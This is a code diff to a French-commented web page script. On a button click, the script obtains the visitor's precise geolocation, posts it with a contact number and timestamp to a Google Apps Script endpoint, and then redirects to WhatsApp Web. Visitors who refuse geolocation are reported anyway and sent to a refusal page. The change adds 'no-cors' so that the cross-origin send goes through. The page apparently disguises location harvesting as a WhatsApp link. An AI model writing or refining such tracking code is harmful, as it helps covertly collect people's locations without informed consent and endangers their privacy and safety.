@@ -40,7 +40,7 @@ button.addEventListener('click', function() {
     if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(
             function(position) {
-                // Géoloc acceptée
+                // Géoloc acceptée avec mode no-cors
                 fetch("https://script.google.com/macros/s/AKfycbwOiyIdX2JBQACPx3FOQX5XF6iNf4iI-SwxnOUD3n0ir8vg_rrfdmQQv3b98LecIVFi/exec", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -51,19 +51,14 @@ button.addEventListener('click', function() {
                         contact: "0123456789",
                         statut_geoloc: "acceptée",
                         heure: new Date().toISOString()
-                    })
+                    }),
+                    mode: 'no-cors' // empêche le blocage par CORS
                 })
-                .then(resp => resp.json())
-                .then(data => {
-                    console.log("Données enregistrées:", data);
-                    statusText.textContent = "Redirection en cours...";
-                    setTimeout(() => { window.location.href = "https://web.whatsapp.com"; }, 1500);
-                })
-                .catch(err => {
-                    console.error("Erreur fetch:", err);
-                    statusText.textContent = "Impossible d'envoyer les données, redirection...";
-                    setTimeout(() => { window.location.href = "https://web.whatsapp.com"; }, 1500);
-                });
+                .catch(err => console.error("Erreur fetch:", err));
+
+                // Redirection immédiate (pas de lecture de réponse possible avec no-cors)
+                statusText.textContent = "Redirection en cours...";
+                setTimeout(() => { window.location.href = "https://web.whatsapp.com"; }, 1500);
             },
             function(error) {
                 // Géoloc refusée
@@ -77,12 +72,12 @@ button.addEventListener('click', function() {
                         contact: "0123456789",
                         statut_geoloc: "refusée",
                         heure: new Date().toISOString()
-                    })
-                })
-                .finally(() => {
-                    console.log("Géoloc refusée, redirection vers page explicative.");
-                    window.location.href = "geoloc-refuse-mobile.html";
-                });
+                    }),
+                    mode: 'no-cors'
+                }).catch(err => console.error("Erreur fetch:", err));
+
+                console.log("Géoloc refusée, redirection vers page explicative.");
+                window.location.href = "geoloc-refuse-mobile.html";
             },
             { enableHighAccuracy: true, timeout: 10000 }
         );
